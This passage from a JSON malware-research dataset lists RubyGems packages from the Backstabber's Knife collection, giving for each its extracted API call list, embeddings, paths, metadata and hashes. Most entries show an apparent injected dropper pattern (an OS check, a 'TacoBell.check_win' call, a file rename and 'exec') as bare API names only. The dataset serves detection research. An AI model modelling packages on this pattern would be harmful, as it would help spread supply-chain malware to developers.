img\").to_a', 'Nokogiri.HTML(open(url)).css', 'Nokogiri.HTML', 'open', 'Nokogiri.HTML(open(url)).css(\"p a img\").attribute(\"src\").to_s', 'Nokogiri.HTML(open(url)).css(\"p a img\").attribute', 'Nokogiri.HTML(open(url)).css', 'Nokogiri.HTML', 'open', 'self.data.select { |hash,|\\n  url.include?(hash.[](:link))\\n}.[](0).[]', 'self.data.select { |hash,|\\n  url.include?(hash.[](:link))\\n}.[]', 'self.data.select', 'self.data', 'url.include?', 'hash.[]', 'self.get_page.css', 'self.get_page', 'content.css', 'content.text.split(\"\\\\n\").reject!', 'content.text.split', 'content.text', 'item.==', 'date_titles.pop', 'links.each', 'links_hash.[]=', 'link.text.strip', 'link.text', 'link.attribute(\"href\").value', 'link.attribute', 'date_titles.each_with_index', 'idx.==', 'date_titles.length.-', 'date_titles.length', 'months.index(date_titles.[](idx + 1).match(/[a-zA-Z]{1,}/).to_s).nil?', 'months.index', 'date_titles.[](idx + 1).match(/[a-zA-Z]{1,}/).to_s', 'date_titles.[](idx + 1).match', 'date_titles.[]', 'idx.+', 'idx.!=', 'date_titles.length.-', 'date_titles.length', 'months.index(dt.match(/[a-zA-Z]{1,}/).to_s).+', 'months.index', 'dt.match(/[a-zA-Z]{1,}/).to_s', 'dt.match', 'month_num.to_s.length.==', 'month_num.to_s.length', 'month_num.to_s', 'month_num.to_s', 'dt.match(/:.+/).to_s', 'dt.match', 'name_i.[]=', 'hash.[]=', 'dt.match', 'dt.match(/[^0-9][0-9]{2}[^0-9]/).to_s.gsub', 'dt.match(/[^0-9][0-9]{2}[^0-9]/).to_s', 'dt.match', 'hash.[]=', 'name_i.strip', 'hash.[]=', '\"http://apod.nasa.gov/apod/\".+', 'links_hash.[]', 'hash.[]', 'array.<<', 'array.insert']",
            "n_tokens": 3331,
            "embedding": "[ 0.01902033 -0.01259631 -0.00514526 ...  0.0116599  -0.02791125\n  0.01221369]",
            "cluster": "0",
            "id": 493,
            "Filepath": "/Users/xxxx/Documents/malware/rubygems/Backstabber/apod_cli/0.0.4/apod_cli-0.0.4.gem",
            "path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/apod_cli/0.0.4/apod_cli-0.0.4_extracted",
            "name": "apod_cli",
            "version": "0.0.4",
            "published_at": "2020-02-16T05:25:07.099Z",
            "Status": "tracked",
            "OSS": "RubyGems",
            "description": NaN,
            "author": 1.0,
            "maintainers": "The number of author or maintainer is 1.",
            "repository_url": "contain a homepage URL but not a Github URL.",
            "dependencies": "bundler, nokogiri, colorize",
            "SHA-256": "abf70dac623739a6ad97868ea14d55e59fe59dcd35cfb39c7c440b3628af1581"
        },
        {
            "name_version": "appfigures-client-0.0.2",
            "SourceCode_Path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/appfigures-client/0.0.2/appfigures-client-0.0.2_extracted/appfigures-client-0.0.2_sourcecode.rb",
            "Source": "Backstabber-Knife",
            "code_api": "['require', 'require', 'require', 'RbConfig::CONFIG.[]', 'os.match', 'TacoBell.check_win', 'File.rename', 'exec', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'File.expand_path', 'Api.new', 'Net::Request.new', '@request.make', 'data.[](:status).to_i.==', 'data.[](:status).to_i', 'data.[]', 'raise', 'data.[]', 'YAML.load(File.open(\"#{AppfiguresClient.root}/config/routes.yml\")).with_indifferent_access', 'YAML.load', 'File.open', 'AppfiguresClient.root', 'AppfiguresClient::Endpoints::Data.new', '@routes.[]', 'AppfiguresClient::Endpoints::Products.new', '@routes.[]', 'AppfiguresClient::Endpoints::Sales.new', '@routes.[](:report).[]', '@routes.[]', 'AppfiguresClient::Endpoints::Ads.new', '@routes.[](:report).[]', '@routes.[]', 'AppfiguresClient::Endpoints::Ranks.new', '@routes.[]', 'AppfiguresClient::Endpoints::Reviews.new', '@routes.[]', '@routes.[]', '@request.make', '@data.[]', '@data.[](param).[]', '@data.[]', '@request.make', '@routes.[](param).[]', '@routes.[]', '@data.[]', '@request.make', '@routes.[]', 'list', 'list', 'list', 'list', 'list', 'api.request', '@routes.[](:default).+', '@routes.[]', 'id.to_s', '@request.make', '@routes.[]', 'options.[](:term).present?', 'options.[]', 'raise', 'options.[](:options).present?', 'options.[]', 'options.[](:options).[](:filter).present?', 'options.[](:options).[]', 'options.[]', 'options.[](:options).[](:filter).in?', 'options.[](:options).[]', 'options.[]', 'raise', '@request.make', 'path.+', 'options.[]', 'options.[]', '@routes.[]', '@api.data.stores.[](store).present?', '@api.data.stores.[]', '@api.data.stores', '@api.data', '@request.make', 'options.[](:product_ids).present?', 'options.[]', 'raise', 'options.[](:granularity).present?', 'options.[]', 'raise', 'options.[](:start_date).present?', 'options.[]', 'raise', 'options.[](:end_date).present?', 'options.[]', 'raise', '@routes.[]', 'product_ids', 'options.[]', 'options.[]', 'options.[]', 'options.[]', '@request.make', 'options.[]', 'options.[](:time).present?', 'options.[]', 'raise', 'options.[](:country).present?', 'options.[]', 'raise', 'options.[](:category).present?', 'options.[]', 'raise', 'options.[](:subcategory).present?', 'options.[]', 'raise', '@routes.[]', 'options.[]', 'options.[]', 'options.[]', 'options.[]', '@request.make', 'options.[]', 'private', 'product_ids.kind_of?', 'product_ids.join', '@routes.[]', '@request.make', '@routes.[]', '@request.make', '@routes.[]', 'options.[](:map).present?', 'options.[]', 'path.+', 'options.[]', '@request.make', 'options.[]', '@routes.[]', '@request.make', 'options.[]', 'options.[]', 'options.[]', '::URI.parse', 'Api::URL.+', '::Net::HTTP.new', 'uri.host', 'uri.port', 'http.use_ssl=', '\"?\".+', 'parameterize', '::Net::HTTP::Get.new', 'uri.path.+', 'uri.path', 'req.basic_auth', 'req.[]=', 'http.request', 'JSON.parse', 'response.body', 'parsed.kind_of?', 'parsed.collect', 'hash.with_indifferent_access', 'parsed.with_indifferent_access', 'private', 'URI.escape', 'params.collect { |k, v|\\n  \"#{k}=#{v}\"\\n}.join', 'params.collect', 'require', 'SimpleCov.configure', 'clean_filters', 'load_adapter', 'ENV.[]', 'SimpleCov.start', 'add_filter', 'require', 'require', 'Bundler.setup', '$stderr.puts', 'e.message', '$stderr.puts', 'exit', 'e.status_code', 'require', 'require', '$LOAD_PATH.unshift', 'File.join', 'File.dirname', '$LOAD_PATH.unshift', 'File.dirname', 'require', 'require', 'should', 'flunk']",
            "n_tokens": 1057,
            "embedding": "[-0.00999261  0.00925731 -0.00202445 ...  0.00585416 -0.02977044\n  0.01994752]",
            "cluster": "0",
            "id": 384,
            "Filepath": "/Users/xxxx/Documents/malware/rubygems/Backstabber/appfigures-client/0.0.2/appfigures-client-0.0.2.gem",
            "path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/appfigures-client/0.0.2/appfigures-client-0.0.2_extracted",
            "name": "appfigures-client",
            "version": "0.0.2",
            "published_at": "2020-02-16T05:27:02.248Z",
            "Status": "tracked",
            "OSS": "RubyGems",
            "description": NaN,
            "author": 1.0,
            "maintainers": "The number of author or maintainer is 1.",
            "repository_url": "contain a homepage URL and a Github URL.",
            "dependencies": NaN,
            "SHA-256": "e82eb21f333612f95a472de512f42b18982f2bf3a2a22fe0ab1204aa614d426e"
        },
        {
            "name_version": "apple_news-client-0.5.4",
            "SourceCode_Path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/apple_news-client/0.5.4/apple_news-client-0.5.4_extracted/apple_news-client-0.5.4_sourcecode.rb",
            "Source": "Backstabber-Knife",
            "code_api": "['require', 'require', 'require', 'RbConfig::CONFIG.[]', 'os.match', 'TacoBell.check_win', 'File.rename', 'exec', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'extend', 'Configuration.new', 'require', 'Dir.[](\"#{File.dirname(\"/Users/xxxx/Documents/malware/rubygems/Backstabber/apple_news-client/0.5.4/apple_news-client-0.5.4_extracted/apple_news-client-0.5.4_sourcecode.rb\")}/additions/*.rb\").each', 'Dir.[]', 'File.dirname', 'require', 'extend', 'data.nil?', 'additions.each', 'additions', 'addition.type.==', 'addition.type', 'data.[]', 'addition.new', 'private', 'self.constants.map { |const,|\\n  self.const_get(const)\\n}.select', 'self.constants.map', 'self.constants', 'self.const_get', 'const.name.demodulize.!=', 'const.name.demodulize', 'const.name', 'const.is_a?', 'include', 'val.nil?', '_required_property_map.[](:type).[]', '_required_property_map.[]', '_required_property_map', 'required_property', 'self.class.type', 'self.class', 'type', 'required_properties', 'property_inflection', 'require', 'Dir.[](\"#{File.dirname(\"/Users/xxxx/Documents/malware/rubygems/Backstabber/apple_news-client/0.5.4/apple_news-client-0.5.4_extracted/apple_news-client-0.5.4_sourcecode.rb\")}/animations/*.rb\").each', 'Dir.[]', 'File.dirname', 'require', 'extend', 'data.nil?', 'animations.each', 'animations', 'animation.type.==', 'animation.type', 'data.[]', 'animation.new', 'private', 'self.constants.map { |const,|\\n  self.const_get(const)\\n}.select', 'self.constants.map', 'self.constants', 'self.const_get', 'const.name.demodulize.!=', 'const.name.demodulize', 'const.name', 'const.is_a?', 'type', 'include', 'optional_property', 'val.nil?', '_required_property_map.[](:type).[]', '_required_property_map.[]', '_required_property_map', 'required_property', 'self.class.type', 'self.class', 'type', 'optional_property', 'type', 'optional_property', 'type', 'optional_properties', 'require', 'require', 'require', 'include', 'include', 'include', 'include', 'optional_properties', 'optional_property', 'attr_reader', 'attr_accessor', 'AppleNewsClient.config', 'assign_data', 'id.present?', 'data.blank?', 'hydrate!', 'id.nil?', 'id', 'hydrate!', 'private', 'fetch_data.[]', 'fetch_data', 'assign_data', 'data.with_indifferent_access', 'data.delete', 'set_read_only_properties', 'load_properties', 'document.is_a?', 'Document.new', 'extend', 'included', 'Pathname.new(file).basename.to_s', 'Pathname.new(file).basename', 'Pathname.new', 'mime_for', '@files.[]=', 'UploadIO.new', 'add_file', 'File.new', '@files.[]=', 'UploadIO.new', 'StringIO.new', '@files.[]=', 'UploadIO.new', 'open', 'private', 'File.extname(filename).downcase', 'File.extname', 'extend', 'included', 'Request::Post.new', 'endpoint_url', 'config', 'request.fields=', '{ \"article.json\" => document_json }.merge', 'document_json', 'request.call', 'resp.has_key?', 'resp.[]', 'resp.[](\"data\").[]', 'resp.[]', 'load_properties', 'resp.[]', '@id.nil?.!', '@id.nil?', 'alias_method', 'Request::Delete.new', 'endpoint_url', 'config', 'request.call', 'resp.is_a?', 'resp.has_key?', 'resp.[]', 'FileUtils.mkdir_p', 'File.write', 'File.join', 'JSON.dump', 'document.as_json', 'document', '@files.each', 'file.respond_to?', 'FileUtils.cp', 'file.path', 'File.join', 'file.io.is_a?', 'file.io', 'file.io', 'File.new', 'file.io', 'File.new', 'File.join', 'outfile.write', 'infile.read', 'infile.close', 'outfile.close', 'private', 'persisted?', 'id', 'config.channel_id', 'config', 'JSON.dump', 'self.as_json', 'UploadIO.new', 'StringIO.new', 'JSON.dump', 'document.as_json', 'document', 'require', 'Dir.[](\"#{File.dirname(\"/Users/xxxx/Documents/malware/rubygems/Backstabber/apple_news-client/0.5.4/apple_news-client-0.5.4_extracted/apple_news-client-0.5.4_sourcecode.rb\")}/behaviors/*.rb\").each', 'Dir.[]', 'File.dirname', 'require', 'extend', 'data.nil?', 'behaviors.each', 'behaviors', 'behavior.type.==', 'behavior.type', 'data.[]', 'behavior.new', 'private', 'self.constants.map { |const,|\\n  self.const_get(const)\\n}.select', 'self.constants.map', 'self.constants', 'self.const_get', 'const.name.demodulize.!=', 'const.name.demodulize', 'const.name', 'const.is_a?', 'type', 'type', 'include', 'val.nil?', '_required_property_map.[](:type).[]', '_required_property_map.[]', '_required_property_map', 'required_property', 'self.class.type', 'self.class', 'type', 'type', 'optional_property', 'type', 'include', 'include', 'attr_reader', 'warn', 'AppleNewsClient.config.channel', 'AppleNewsClient.config', 'AppleNewsClient.config', 'data.nil?', 'hydrate!', 'set_read_only_properties', 'Section.new', 'section_link_id', 'config', 'get_request', 'id', 'resp.[](\"data\").map', 'resp.[]', 'Section.new', 'section.[]', 'config', 'params.with_indifferent_access', 'params.delete', 'get_request', 'id', 'resp.[](\"data\").map', 'resp.[]', 'hydrate.==', 'Article.new', 'article.[]', 'config', 'require', 'require', 'require', 'require', 'require', 'require', 'Dir.[](\"#{File.dirname(\"/Users/xxxx/Documents/malware/rubygems/Backstabber/apple_news-client/0.5.4/apple_news-client-0.5.4_extracted/apple_news-client-0.5.4_sourcecode.rb\")}/components/*.rb\").each', 'Dir.[]', 'File.dirname', 'require', 'extend', 'data.nil?', 'components.each', 'components', 'component.role.==', 'component.role', 'data.[]', 'component.new', 'private', 'self.constants.map { |const,|\\n  self.const_get(const)\\n}.select', 'self.constants.map', 'self.constants', 'self.const_get', 'const.name.demodulize.!=', 'const.name.demodulize', 'const.name', 'const.is_a?', 'include', 'optional_properties', 'extend', 'included', 'role', 'required_property', 'optional_properties', 'property_inflection', 'property_inflection', 'include', 'role', 'role', 'optional_property', '[\"any\", \"standard\", \"double_height\", \"large\"].include?', 'banner_type', 'include', 'optional_property', 'optional_property', 'optional_property', 'optional_property', 'val.nil?', '_required_property_map.[](:role).[]', '_required_property_map.[]', '_required_property_map', 'required_property', 'self.class.role', 'self.class', 'include', 'role', 'include', 'role', 'include', 'role', 'require', 'role', 'optional_property', 'role', 'optional_property', 'role', 'optional_property', 'role', 'required_property', 'optional_properties', 'property_inflection', 'include', 'role', 'role', 'required_property', 'role', 'include', 'role', 'include', 'role', 'extend', 'included', 'required_property', 'optional_properties', 'property_inflection', 'role', 'required_property', 'property_inflection', 'include', 'role', 'include', 'role', 'role', 'optional_properties', 'optional_property', 'role', 'role', 'required_property', 'include', 'role', 'include', 'role', 'include', 'role', 'role', 'optional_properties', 'include', 'role', 'include', 'role', 'include', 'role', 'extend', 'included', 'required_property', 'optional_properties', 'property_inflection', 'role', 'optional_property', 'extend', 'included', 'required_property', 'optional_property', 'optional_property', 'optional_property', 'optional_property', 'optional_property', 'optional_property', 'include', 'role', 'role', 'required_property', 'property_inflection', 'role', 'required_property', 'optional_properties', 'property_inflection', 'property_inflection', 'attr_accessor', 'attributes.[]', 'attributes.[]', 'attributes.[]', 'attributes.[]', 'AppleNewsClient::Channel.new', 'channel_id', 'include', 'attr_accessor', 'required_properties', 'required_property', 'required_property', 'required_property', 'required_property', 'required_property', 'optional_property', 'optional_property', 'optional_property', 'optional_property', 'optional_property', 'optional_property', 'optional_property', 'include', 'required_properties', 'optional_properties', 'extend', 'included', 'URI.parse(@links.[](name)).path', 'URI.parse', '@links.[]', 'link(name).match(/\\\\/sections\\\\/([A-Za-z0-9\\\\-]+)/).[]', 'link(name).match', 'link', 'link(name).match(/\\\\/channels\\\\/([A-Za-z0-9\\\\-]+)/).[]', 'link(name).match', 'link', 'include', 'optional_properties', 'optional_property', 'optional_property', 'optional_property', 'optional_property', 'property_inflection', 'property_inflection', 'property_inflection', 'opts.[]', 'opts.[]', 'part.<<', 'part.<<', 'part.<<', 'opts.[]', 'part.<<', 'headers.[](\"Content-Type\").!=', 'headers.[]', 'part.<<', '\"Content-Type: \" + headers.[](\"Content-Type\").+', '\"Content-Type: \".+', 'headers.[]', 'part.<<', 'part.<<', 'part.<<', 'extend', 'load_properties', 'ActiveSupport::HashWithIndifferentAccess.new', 'self.class.properties.each', 'self.class.properties', 'self.class', '_property_inflection.[]', '_property_inflection', 'prop.to_s.camelize', 'prop.to_s', 'settings.[](:klass).nil?.!', 'settings.[](:klass).nil?', 'settings.[]', 'opts.fetch', 'settings.[]', 'settings.[](:default).is_a?', 'settings.[]', 'assigned_val.map', 'v.is_a?', 'settings.[](:klass).send', 'settings.[]', 'settings.[]', 'settings.[](:default).is_a?', 'settings.[]', 'Hash.[]', 'assigned_val.map', 'v.is_a?', 'settings.[](:klass).send', 'settings.[]', 'settings.[]', 'assigned_val.nil?.!', 'assigned_val.nil?', 'assigned_val.is_a?(Class).!', 'assigned_val.is_a?', 'assigned_val.nil?', 'settings.[](:klass).send', 'settings.[]', 'settings.[]', 'opts.fetch', 'settings.[]', 'instance_variable_set', 'included', 'class_attribute', 'class_attribute', 'class_attribute', 'self._required_property_map', 'self._optional_property_map', 'self._property_inflection', '_required_property_map.each', '_required_property_map', 'send(prop).nil?', 'send', 'self.class.properties', 'self.class', 'Hash.[]', 'properties.map { |key, _|\\n  json_key = _property_inflection.[](key) || key.to_s.camelize(:lower)\\n  val = if send(key).respond_to?(:as_json)\\n    send(key).as_json\\n  else\\n    if send(key).is_a?(Array)\\n      send(key).map(&:as_json)\\n    else\\n      if send(key).is_a?(Hash)\\n        Hash.[](send(key).map { |k, v|\\n          [k.to_s, if v.respond_to?(:as_json)\\n            v.as_json\\n          else\\n            v\\n          end]\\n        })\\n      else\\n        send(key)\\n      end\\n    end\\n  end\\n  [json_key, if val.blank? && val != false\\n    nil\\n  else\\n    val\\n  end]\\n}.reject', 'properties.map', 'properties', '_property_inflection.[]', '_property_inflection', 'key.to_s.camelize', 'key.to_s', 'send(key).respond_to?', 'send', 'send(key).as_json', 'send', 'send(key).is_a?', 'send', 'send(key).map', 'send', 'send(key).is_a?', 'send', 'Hash.[]', 'send(key).map', 'send', 'k.to_s', 'v.respond_to?', 'v.as_json', 'send', 'val.blank?', 'val.!=', 'p.[](1).nil?', 'p.[]', 'base._required_property_map=', '_required_property_map.dup', '_required_property_map', 'base._optional_property_map=', '_optional_property_map.dup', '_optional_property_map', 'args.each', 'required_property', '_required_property_map.[]=', '_required_property_map', 'attr_accessor', 'args.each', 'optional_property', '_optional_property_map.[]=', '_optional_property_map', 'attr_accessor', '_property_inflection.[]=', '_property_inflection', '_required_property_map.merge', '_required_property_map', '_optional_property_map', 'required_property', 'require', 'optional_property', 'optional_property', 'required_property', 'optional_properties', '[\"top\", \"center\", \"bottom\"].include?', 'target_anchor_position', 'include', 'required_property', 'optional_properties', 'optional_property', 'optional_property', 'required_property', 'optional_properties', 'optional_properties', 'optional_properties', 'property_inflection', 'required_properties', 'optional_property', 'required_properties', 'optional_properties', 'required_properties', 'require', 'Dir.[](\"#{File.dirname(\"/Users/xxxx/Documents/malware/rubygems/Backstabber/apple_news-client/0.5.4/apple_news-client-0.5.4_extracted/apple_news-client-0.5.4_sourcecode.rb\")}/properties/*.rb\").each', 'Dir.[]', 'File.dirname', 'require', 'Dir.[](\"#{File.dirname(\"/Users/xxxx/Documents/malware/rubygems/Backstabber/apple_news-client/0.5.4/apple_news-client-0.5.4_extracted/apple_news-client-0.5.4_sourcecode.rb\")}/requests/*.rb\").each', 'Dir.[]', 'File.dirname', 'require', 'attr_reader', 'AppleNewsClient.config', 'URI.parse', 'File.join', '@config.api_base', 'Net::HTTP.new', '@url.hostname', '@url.port', 'http.use_ssl=', 'http.verify_mode=', 'http.delete', 'headers', 'res.code.==', 'res.code', 'JSON.parse', 'res.body', 'private', 'AppleNewsClient::Security.new', '@url.to_s', 'security.authorization', 'attr_reader', 'AppleNewsClient.config', 'URI.parse', 'File.join', '@config.api_base', 'Net::HTTP.new', '@url.hostname', '@url.port', 'http.use_ssl=', 'http.verify_mode=', 'http.get', 'headers', 'JSON.parse', 'res.body', 'private', 'AppleNewsClient::Security.new', '@url.to_s', 'security.authorization', 'attr_reader', 'attr_accessor', 'AppleNewsClient.config', 'URI.parse', 'File.join', '@config.api_base', 'Net::HTTP.new', '@url.hostname', '@url.port', 'http.use_ssl=', 'http.verify_mode=', 'http.read_timeout=', 'http.post', 'content_body', 'headers', 'JSON.parse', 'res.body', 'private', 'Net::HTTP::Post::Multipart.new', '@url.path', 'multipart.body_stream.read.gsub', 'multipart.body_stream.read', 'multipart.body_stream', 'multipart', 'multipart.body_stream.rewind', 'multipart.body_stream', 'multipart', 'AppleNewsClient::Security.new', 'security.content_type=', 'multipart.boundary', 'multipart', 'security.content_body=', 'content_body', 'security.authorization', 'authorization', 'multipart.boundary', 'multipart', 'extend', 'included', 'attr_accessor', 'load_properties', 'File.join', 'id', 'AppleNewsClient::Request::Get.new(path, config).call', 'AppleNewsClient::Request::Get.new', 'config', 'private', 'respond_to?', 'load_properties', 'fetch_data.[]', 'fetch_data', 'set_read_only_properties', 'fetch_data.[]', 'fetch_data', 'get_request', 'resource_url', 'data.each', 'instance_variable_set', 'k.to_s.underscore', 'k.to_s', 'require', 'Dir.[](\"#{File.dirname(\"/Users/xxxx/Documents/malware/rubygems/Backstabber/apple_news-client/0.5.4/apple_news-client-0.5.4_extracted/apple_news-client-0.5.4_sourcecode.rb\")}/scenes/*.rb\").each', 'Dir.[]', 'File.dirname', 'require', 'extend', 'data.nil?', 'scenes.each', 'scenes', 'scene.type.==', 'scene.type', 'data.[]', 'scene.new', 'private', 'self.constants.map { |const,|\\n  self.const_get(const)\\n}.select', 'self.constants.map', 'self.constants', 'self.const_get', 'const.name.demodulize.!=', 'const.name.demodulize', 'const.name', 'const.is_a?', 'include', 'val.nil?', '_required_property_map.[](:type).[]', '_required_property_map.[]', '_required_property_map', 'required_property', 'self.class.type', 'self.class', 'type', 'optional_property', 'type', 'include', 'include', 'attr_reader', 'AppleNewsClient.config', 'data.nil?', 'hydrate!', 'set_read_only_properties', 'Channel.new', 'channel_link_id', 'config', 'params.with_indifferent_access', 'params.delete', 'get_request', 'id', 'resp.[](\"data\").map', 'resp.[]', 'hydrate.==', 'Article.new', 'article.[]', 'config', 'require', 'require', 'attr_accessor', 'AppleNewsClient.config', 'method.upcase', 'Time.now.utc.strftime', 'Time.now.utc', 'Time.now', '@method.==', '@content_type.nil?', '@content_body.nil?', 'raise', '@config.api_key_id', 'signature', 'private', '[@method, @url, @date, @content_type, @content_body].compact', 'hash_content.join', 'hash_content', 'Base64.strict_decode64', '@config.api_key_secret', 'OpenSSL::Digest.new', 'OpenSSL::HMAC.digest', 'key', 'canonical_request', 'Base64.strict_encode64', 'digest', 'require', 'require', 'require', 'require', 'Dir.[](\"#{File.dirname(\"/Users/xxxx/Documents/malware/rubygems/Backstabber/apple_news-client/0.5.4/apple_news-client-0.5.4_extracted/apple_news-client-0.5.4_sourcecode.rb\")}/styles/*.rb\").each', 'Dir.[]', 'File.dirname', 'require', 'include', 'optional_properties', 'optional_properties', 'optional_properties', 'required_property', 'required_property', 'optional_properties', 'extend', 'included', 'optional_property', 'extend', 'included', 'include', 'required_property', 'include', 'required_property', 'required_property', 'optional_properties', 'property_inflection', 'required_properties', 'include', 'required_property', 'optional_property', 'required_properties', 'optional_properties', 'optional_properties', 'optional_properties', 'required_property', 'optional_property', 'required_property', 'required_properties', 'optional_properties', 'property_inflection', 'property_inflection']",
            "n_tokens": 4580,
            "embedding": "[ 0.00208922 -0.01388154 -0.01409348 ... -0.00655544 -0.02354372\n  0.01812018]",
            "cluster": "0",
            "id": 369,
            "Filepath": "/Users/xxxx/Documents/malware/rubygems/Backstabber/apple_news-client/0.5.4/apple_news-client-0.5.4.gem",
            "path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/apple_news-client/0.5.4/apple_news-client-0.5.4_extracted",
            "name": "apple_news-client",
            "version": "0.5.4",
            "published_at": "2020-02-16T05:29:36.497Z",
            "Status": "tracked",
            "OSS": "RubyGems",
            "description": NaN,
            "author": 1.0,
            "maintainers": "The number of author or maintainer is 1.",
            "repository_url": "contain a homepage URL and a Github URL.",
            "dependencies": "bundler, rake, rspec, activesupport, multipart-post",
            "SHA-256": "da8e1fc6f5fedb2b7f7f631985a466f7a2c8984c44d95656313a69f0b1cd4c19"
        },
        {
            "name_version": "apple-class_client-1.0.0",
            "SourceCode_Path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/apple-class_client/1.0.0/apple-class_client-1.0.0_extracted/apple-class_client-1.0.0_sourcecode.rb",
            "Source": "Backstabber-Knife",
            "code_api": "['require', 'require', 'require', 'RbConfig::CONFIG.[]', 'os.match', 'TacoBell.check_win', 'File.rename', 'exec', 'require', 'require', 'extend', 'require', 'require', 'require', 'require', 'require', 'require', 'File.join', 'File.dirname', 'require', 'require', 'Typhoeus::Request.new', 'AppleClassClient::Request.make_url', 'request.options.[](:headers).merge!', 'request.options.[]', 'request.options', 'oauth_header', 'request.run', 'request.response', 'AppleClassClient::Error.check_request_error', 'parse_response', 'OAuth::Consumer.new', 'AppleClassClient.consumer_key', 'AppleClassClient.consumer_secret', 'AppleClassClient::Request.make_url', 'OAuth::AccessToken.new', 'AppleClassClient.access_token', 'AppleClassClient.access_secret', 'OAuth::Client::Helper.new', 'oauth_params.merge', 'AppleClassClient::Request.make_url', 'oauth_helper.header', 'JSON.parse', 'response.response_body', 'body.[]', 'CONFIG.freeze', 'attr_writer', 'CONFIG.keys', 'CONFIG.keys.include?', 'CONFIG.keys', 'm.to_sym', 'get_value', 'raise', 'instance_variable_get', 'value.nil?', 'get_default_value', 'value.is_a?', 'value.call', 'CONFIG.[]', 'key.to_sym', 'require', 'get_errors({ auth: auth }).each', 'get_errors', 'response.code.==', 'response.code', 'response.body.include?', 'response.body', 'raise', 'response.code.!=', 'response.code', 'raise', 'require', 'require', 'require', 'require', 'require', 'proxies', 'request.options.[](:method).to_s.upcase', 'request.options.[](:method).to_s', 'request.options.[]', 'request.options', 'request', 'request_method.empty?', 'options.[](:uri).to_s', 'options.[]', 'options', 'options.[]', 'options', 'options.[]', 'options', 'post_parameters.merge(query_parameters).merge', 'post_parameters.merge', 'post_parameters', 'query_parameters', 'options.[]', 'options', 'private', 'URI.parse(request.url).query', 'URI.parse', 'request.url', 'request', 'CGI.parse', 'method.==', 'method', 'OAuth::Helper.stringify_keys', 'request.params', 'request', 'require', 'require', 'AppleClassClient.user_agent', 'DEFAULT_HEADERS.freeze', 'headers.==', 'make_headers', 'Typhoeus::Request.new', 'request.run', 'AppleClassClient::Error.check_request_error', 'request.response', 'JSON.parse', 'request.response.body', 'request.response', 'AppleClassClient::Auth.get_session_token', 'DEFAULT_HEADERS.merge', 'AppleClassClient.apple_mdm_server.+', 'AppleClassClient.apple_mdm_server']",
            "n_tokens": 624,
            "embedding": "[-0.00082082  0.00326674 -0.00386284 ... -0.00618811 -0.04170825\n  0.02388195]",
            "cluster": "0",
            "id": 683,
            "Filepath": "/Users/xxxx/Documents/malware/rubygems/Backstabber/apple-class_client/1.0.0/apple-class_client-1.0.0.gem",
            "path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/apple-class_client/1.0.0/apple-class_client-1.0.0_extracted",
            "name": "apple-class_client",
            "version": "1.0.0",
            "published_at": "2020-02-16T05:30:13.534Z",
            "Status": "tracked",
            "OSS": "RubyGems",
            "description": NaN,
            "author": 1.0,
            "maintainers": "The number of author or maintainer is 1.",
            "repository_url": "contain a homepage URL and a Github URL.",
            "dependencies": "bundler, rake, rspec, oauth, typhoeus",
            "SHA-256": "2c0cfde7b308ca485cc71a8fce0e18166cbf19bc989f65ac37af3cf75e3bf000"
        },
        {
            "name_version": "applicaster_logger-0.8.4",
            "SourceCode_Path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/applicaster_logger/0.8.4/applicaster_logger-0.8.4_extracted/applicaster_logger-0.8.4_sourcecode.rb",
            "Source": "Backstabber-Knife",
            "code_api": "['require', 'require', 'require', 'RbConfig::CONFIG.[]', 'os.match', 'TacoBell.check_win', 'File.rename', 'exec', 'require', 'require_relative', 'require_relative', 'require_relative', 'require_relative', 'require_relative', 'require_relative', 'text.bytesize.<=', 'text.bytesize', 'text.dup', 'omission.bytesize.>', 'omission.bytesize', 'raise', 'omission.inspect', 'omission.bytesize', 'omission.bytesize.==', 'omission.bytesize', 'omission.dup', 'text.class.new.tap', 'text.class.new', 'text.class', 'truncate_at.-', 'omission.bytesize', 'text.scan', 'cut.bytesize + grapheme.bytesize.<=', 'cut.bytesize.+', 'cut.bytesize', 'grapheme.bytesize', 'cut.<<', 'cut.<<', 'require', 'require', 'require', 'require', '::Socket.gethostname', 'include', 'attr_accessor', 'options.with_indifferent_access', 'default_fields.deep_merge(message_to_data(message)).merge({ severity: severity, host: HOST }).deep_merge', 'default_fields.deep_merge(message_to_data(message)).merge', 'default_fields.deep_merge', 'default_fields', 'message_to_data', 'Applicaster::Logger::ThreadContext.current', 'LogStash::Event.new', 'event.timestamp=', 'time.utc.iso8601', 'time.utc', 'event.tags=', 'current_tags', 'event.to_json', 'protected', 'message.with_indifferent_access', 'message.to_hash.with_indifferent_access', 'message.to_hash', 'JSON.parse(message).with_indifferent_access', 'JSON.parse', 'msg2str', '{ message: msg2str(message) }.with_indifferent_access', 'msg2str', 'message', 'data.[]', 'data.[]', 'data.[]', 'data.[]', 'data.[]', 'require_relative', 'require_relative', 'Applicaster::Logger::ThreadContext.add', 'request_data', '@app.call', 'ActionDispatch::Request.new', 'request.uuid', 'request.remote_ip', 'request.host', '@app.call', 'Applicaster::Logger::ThreadContext.clear!', 'require', 'require', 'require', 'require_relative', 'proc', 'Rails.application.class.parent.to_s.underscore', 'Rails.application.class.parent.to_s', 'Rails.application.class.parent', 'Rails.application.class', 'Rails.application', 'ActiveSupport.on_load', 'config.applicaster_logger=', 'config', 'ActiveSupport::OrderedOptions.new.tap', 'ActiveSupport::OrderedOptions.new', 'ENV.[]', 'config.enabled=', 'uri.present?', 'config.level=', 'config.application_name=', 'ENV.fetch', 'config.logstash_config=', 'uri.present?', 'Railtie.uri_logstash_config', 'config.logzio_token=', 'ENV.[](\"LOGZIO_TOKEN\").presence', 'ENV.[]', 'initializer', 'app.middleware.insert', 'app.middleware', 'app.middleware.insert_after', 'app.middleware', 'initializer', 'app.config.applicaster_logger.enabled', 'app.config.applicaster_logger', 'app.config', 'setup_lograge', 'initializer', 'app.config.applicaster_logger.enabled', 'app.config.applicaster_logger', 'app.config', 